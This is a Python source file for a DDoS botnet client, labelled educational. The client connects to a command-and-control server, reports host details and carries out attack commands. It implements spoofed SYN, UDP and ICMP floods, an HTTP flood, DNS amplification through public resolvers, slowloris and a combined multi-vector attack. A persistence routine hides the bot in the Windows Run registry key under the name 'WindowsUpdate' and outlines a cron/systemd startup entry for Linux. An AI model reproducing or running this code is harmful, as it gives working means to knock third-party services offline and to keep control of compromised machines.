#!/usr/bin/env python3
"""
BOT CLIENT - Zombie that receives commands and executes DDoS attacks
Educational Purpose Only - Understanding how malware operates
"""

import socket
import threading
import json
import time
import hashlib
import random
import platform
import psutil
from scapy.all import *
from typing import Optional

# ============================================================================
# ATTACK ENGINE (Executes the actual DDoS)
# ============================================================================

class AttackEngine:
    """Executes DDoS attacks when commanded by C2"""
    
    def __init__(self, bot_id: str):
        self.bot_id = bot_id
        self.current_attack = None
        self.attacking = False
        self.attack_thread = None
        
    def execute_attack(self, command: dict) -> dict:
        """
        Execute attack command from C2
        Returns result with packet count
        """
        attack_type = command.get('attack_type')
        target_ip = command.get('target_ip')
        target_port = command.get('target_port')
        duration = command.get('duration')
        attack_id = command.get('attack_id')
        
        print(f"[Bot {self.bot_id}] Executing {attack_type} on {target_ip}:{target_port} for {duration}s")
        
        result = {
            'attack_id': attack_id,
            'packets_sent': 0,
            'errors': ''
        }
        
        if attack_type == 'syn_flood':
            result['packets_sent'] = self._syn_flood(target_ip, target_port, duration)
        elif attack_type == 'udp_flood':
            result['packets_sent'] = self._udp_flood(target_ip, target_port, duration)
        elif attack_type == 'http_flood':
            result['packets_sent'] = self._http_flood(target_ip, target_port, duration)
        elif attack_type == 'icmp_flood':
            result['packets_sent'] = self._icmp_flood(target_ip, duration)
        elif attack_type == 'dns_amp':
            result['packets_sent'] = self._dns_amplification(target_ip, duration)
        elif attack_type == 'slowloris':
            result['packets_sent'] = self._slowloris(target_ip, target_port, duration)
        elif attack_type == 'multi_vector':
            result['packets_sent'] = self._multi_vector(target_ip, target_port, duration)
        
        print(f"[Bot {self.bot_id}] Attack complete: {result['packets_sent']} packets sent")
        return result
    
    def _syn_flood(self, target_ip: str, target_port: int, duration: int) -> int:
        """SYN flood attack implementation"""
        end_time = time.time() + duration
        packet_count = 0
        
        # Pre-craft packet template for speed
        ip_template = IP(dst=target_ip)
        tcp_template = TCP(dport=target_port, flags="S")
        
        while time.time() < end_time:
            # Randomize source IP and port
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            seq_num = random.randint(1000, 90000000)
            
            packet = ip_template.copy()
            packet.src = src_ip
            tcp = tcp_template.copy()
            tcp.sport = src_port
            tcp.seq = seq_num
            
            send(packet/tcp, verbose=False)
            packet_count += 1
        
        return packet_count
    
    def _udp_flood(self, target_ip: str, target_port: int, duration: int) -> int:
        """UDP flood with large payloads"""
        end_time = time.time() + duration
        packet_count = 0
        payload = "X" * 1400  # Maximum size for bandwidth saturation
        
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            
            packet = IP(src=src_ip, dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load=payload)
            send(packet, verbose=False)
            packet_count += 1
        
        return packet_count
    
    def _http_flood(self, target_ip: str, target_port: int, duration: int) -> int:
        """HTTP GET flood using requests library"""
        import requests
        end_time = time.time() + duration
        request_count = 0
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        while time.time() < end_time:
            try:
                url = f"http://{target_ip}:{target_port}/"
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                response = requests.get(url, headers=headers, timeout=0.5)
                request_count += 1
            except:
                pass
        
        return request_count
    
    def _icmp_flood(self, target_ip: str, duration: int) -> int:
        """ICMP ping flood"""
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            packet = IP(src=src_ip, dst=target_ip)/ICMP(type=8, code=0)/Raw(load=b"PING" * 250)
            send(packet, verbose=False)
            packet_count += 1
        
        return packet_count
    
    def _dns_amplification(self, target_ip: str, duration: int) -> int:
        """DNS amplification using open resolvers"""
        # In real attack, would use list of open resolvers
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
        end_time = time.time() + duration
        packet_count = 0
        
        dns_query = DNS(qr=0, qd=DNSQR(qname="isc.org", qtype="ANY"))
        
        while time.time() < end_time:
            for dns_server in dns_servers:
                ip = IP(src=target_ip, dst=dns_server)  # Spoof target as source
                udp = UDP(sport=random.randint(1024, 65535), dport=53)
                packet = ip/udp/dns_query
                send(packet, verbose=False)
                packet_count += 1
        
        return packet_count
    
    def _slowloris(self, target_ip: str, target_port: int, duration: int) -> int:
        """Slowloris - keep connections open with partial headers"""
        import socket
        sockets = []
        connection_count = 0
        
        # Create many connections
        for _ in range(200):  # Max connections per bot
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept: text/html\r\n")
                # Intentionally missing final \r\n\r\n
                sockets.append(sock)
                connection_count += 1
            except:
                pass
        
        # Keep them alive
        end_time = time.time() + duration
        while time.time() < end_time:
            for sock in sockets[:]:
                try:
                    sock.send(b"X-Header: keep-alive\r\n")
                except:
                    sockets.remove(sock)
            time.sleep(5)
        
        # Cleanup
        for sock in sockets:
            sock.close()
        
        return connection_count
    
    def _multi_vector(self, target_ip: str, target_port: int, duration: int) -> int:
        """Launch multiple attack types simultaneously"""
        total_packets = 0
        
        # Run attacks in parallel threads
        results = []
        
        def run_attack(attack_func, *args):
            nonlocal total_packets
            result = attack_func(*args)
            results.append(result)
        
        threads = [
            threading.Thread(target=run_attack, args=(self._syn_flood, target_ip, target_port, duration)),
            threading.Thread(target=run_attack, args=(self._udp_flood, target_ip, target_port, duration)),
            threading.Thread(target=run_attack, args=(self._icmp_flood, target_ip, duration))
        ]
        
        for t in threads:
            t.start()
        
        for t in threads:
            t.join()
        
        total_packets = sum(results)
        return total_packets

# ============================================================================
# BOT CLIENT
# ============================================================================

class DDoSBot:
    """
    Bot client that connects to C2 server and executes attacks
    This is what runs on compromised machines
    """
    
    def __init__(self, c2_host: str, c2_port: int, use_ssl: bool = False):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.use_ssl = use_ssl
        self.bot_id = None
        self.socket = None
        self.running = False
        self.attack_engine = None
        
        # Collect system info
        self.system_info = self._get_system_info()
        
    def _get_system_info(self) -> dict:
        """Gather system information for C2"""
        return {
            'version': '1.0',
            'cpu_cores': psutil.cpu_count(),
            'total_ram': psutil.virtual_memory().total // (1024 * 1024),  # MB
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': platform.node()
        }
    
    def _generate_auth_token(self) -> str:
        """Generate authentication token for C2"""
        # In real malware, this would be hardcoded or dynamically generated
        secret = "bot_secret_key"  # Same as C2 expects
        data = f"{self.c2_host}:{self.c2_port}:{secret}"
        return hashlib.sha256(data.encode()).hexdigest()
    
    def connect(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            if self.use_ssl:
                import ssl
                context = ssl.create_default_context()
                self.socket = context.wrap_socket(self.socket, server_hostname=self.c2_host)
            
            self.socket.connect((self.c2_host, self.c2_port))
            
            # Send authentication
            auth_data = {
                'token': self._generate_auth_token(),
                **self.system_info
            }
            self.socket.send(json.dumps(auth_data).encode())
            
            # Receive response
            response = self.socket.recv(1024).decode()
            if response.startswith("AUTH_OK"):
                self.bot_id = response.split('|')[1]
                print(f"[Bot] Authenticated successfully. ID: {self.bot_id}")
                self.attack_engine = AttackEngine(self.bot_id)
                return True
            else:
                print(f"[Bot] Authentication failed: {response}")
                return False
                
        except Exception as e:
            print(f"[Bot] Connection failed: {e}")
            return False
    
    def start(self):
        """Main bot loop - listen for commands"""
        if not self.connect():
            return
        
        self.running = True
        print(f"[Bot] Connected to C2 at {self.c2_host}:{self.c2_port}")
        
        # Send initial heartbeat
        self._send_heartbeat()
        
        # Command loop
        while self.running:
            try:
                # Receive command (with timeout for heartbeat)
                self.socket.settimeout(30)
                data = self.socket.recv(4096).decode()
                
                if not data:
                    break
                
                # Parse command
                # Commands are signed: "command|signature"
                if '|' in data:
                    command_str, signature = data.rsplit('|', 1)
                else:
                    command_str = data
                    signature = None
                
                # Verify signature (simplified)
                # In production, verify with C2 public key
                
                command = json.loads(command_str)
                
                if command.get('type') == 'attack_command':
                    # Execute attack
                    result = self.attack_engine.execute_attack(command)
                    
                    # Send result back to C2
                    self._send_result(result)
                    
                elif command.get('type') == 'heartbeat_response':
                    pass  # Just keep connection alive
                    
                elif command.get('type') == 'update':
                    # Self-update command
                    self._self_update(command)
                    
                elif command.get('type') == 'kill':
                    print("[Bot] Received kill command. Terminating.")
                    self.running = False
                    break
                
                # Send heartbeat
                self._send_heartbeat()
                
            except socket.timeout:
                # Send heartbeat and continue
                self._send_heartbeat()
            except Exception as e:
                print(f"[Bot] Error: {e}")
                break
        
        self.cleanup()
    
    def _send_heartbeat(self):
        """Send heartbeat to C2"""
        try:
            heartbeat = json.dumps({
                'type': 'heartbeat',
                'timestamp': time.time(),
                'status': 'active'
            })
            self.socket.send(heartbeat.encode())
        except:
            pass
    
    def _send_result(self, result: dict):
        """Send attack result to C2"""
        try:
            message = json.dumps({
                'type': 'attack_result',
                **result
            })
            self.socket.send(message.encode())
        except Exception as e:
            print(f"[Bot] Failed to send result: {e}")
    
    def _self_update(self, command: dict):
        """Self-update mechanism"""
        # Download and execute new version
        # In real malware, would fetch from URL and replace itself
        print("[Bot] Self-update requested (not implemented in demo)")
        pass
    
    def cleanup(self):
        """Cleanup before exit"""
        if self.socket:
            self.socket.close()
        print("[Bot] Disconnected")

# ============================================================================
# BOT PERSISTENCE MECHANISMS
# ============================================================================

class BotPersistence:
    """Ensures bot survives reboots"""
    
    @staticmethod
    def install_linux():
        """Install persistence on Linux systems"""
        # Add to crontab
        cron_line = f"@reboot python3 {__file__} &\n"
        # Write to /etc/crontab or user crontab
        
        # Or add to systemd service
        service_content = f"""
[Unit]
Description=DDoS Bot Client
After=network.target

[Service]
ExecStart=/usr/bin/python3 {__file__}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
        # Write to /etc/systemd/system/ddosbot.service
        
        print("[Persistence] Linux persistence installed")
    
    @staticmethod
    def install_windows():
        """Install persistence on Windows"""
        import winreg
        # Add to Run registry key
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, __file__)
        winreg.CloseKey(handle)
        
        print("[Persistence] Windows persistence installed")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════════════╗
║                         DDoS BOT CLIENT                               ║
║                                                                       ║
║  ⚠️  EDUCATIONAL PURPOSE ONLY - Understanding Malware                ║
║  Do not deploy on systems you don't own                             ║
╚═══════════════════════════════════════════════════════════════════════╝
    """)
    
    # Configuration (would be hardcoded or downloaded)
    C2_HOST = "127.0.0.1"  # Change to actual C2 IP
    C2_PORT = 4444
    
    # Start bot
    bot = DDoSBot(C2_HOST, C2_PORT, use_ssl=False)
    
    try:
        bot.start()
    except KeyboardInterrupt:
        print("\n[Bot] Shutting down...")